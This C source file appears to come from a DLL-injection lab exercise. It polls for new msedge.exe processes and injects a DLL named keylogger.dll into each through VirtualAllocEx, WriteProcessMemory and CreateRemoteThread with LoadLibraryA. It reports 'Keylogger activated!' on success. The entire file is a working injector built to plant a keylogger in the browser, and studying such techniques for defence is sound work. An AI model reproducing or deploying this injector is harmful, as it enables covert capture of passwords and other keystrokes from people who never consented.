#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define TARGET_PROCESS "msedge.exe"
#define DLL_PATH "C:\\Users\\namkg\\Downloads\\dll-injection-lab-main\\dll-injection-lab-main\\week4-injection\\dll\\keylogger.dll"

// DLL 인젝션 함수
BOOL InjectDLL(DWORD processId, const char* dllPath) {
    printf("[+] Injecting into PID: %lu\n", processId);
    
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, processId
    );
    
    if (!hProcess) {
        printf("[-] Failed to open process\n");
        return FALSE;
    }
    
    SIZE_T dllPathLen = strlen(dllPath) + 1;
    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, dllPathLen, 
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDllPath) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    if (!WriteProcessMemory(hProcess, pDllPath, dllPath, dllPathLen, NULL)) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)pLoadLibraryA, 
                                       pDllPath, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        printf("[+] DLL injected successfully!\n");
        return TRUE;
    }
    
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
}

int main() {
    printf("=================================\n");
    printf("Auto DLL Injection Monitor\n");
    printf("=================================\n");
    printf("Target: %s\n", TARGET_PROCESS);
    printf("Monitoring... Press Ctrl+C to stop\n\n");
    
    DWORD lastPIDs[100] = {0};
    int lastCount = 0;
    
    while (1) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            Sleep(1000);
            continue;
        }
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, TARGET_PROCESS) == 0) {
                    BOOL isNew = TRUE;
                    for (int i = 0; i < lastCount; i++) {
                        if (lastPIDs[i] == pe32.th32ProcessID) {
                            isNew = FALSE;
                            break;
                        }
                    }
                    
                    if (isNew) {
                        printf("\n[!] NEW TARGET DETECTED!\n");
                        printf("[*] Process: %s (PID: %lu)\n", 
                               pe32.szExeFile, pe32.th32ProcessID);
                        
                        Sleep(2000);
                        
                        if (InjectDLL(pe32.th32ProcessID, DLL_PATH)) {
                            printf("[SUCCESS] Keylogger activated!\n\n");
                        } else {
                            printf("[FAILED] Injection failed!\n\n");
                        }
                        
                        if (lastCount < 100) {
                            lastPIDs[lastCount++] = pe32.th32ProcessID;
                        }
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        Sleep(1000);
    }
    
    return 0;
}
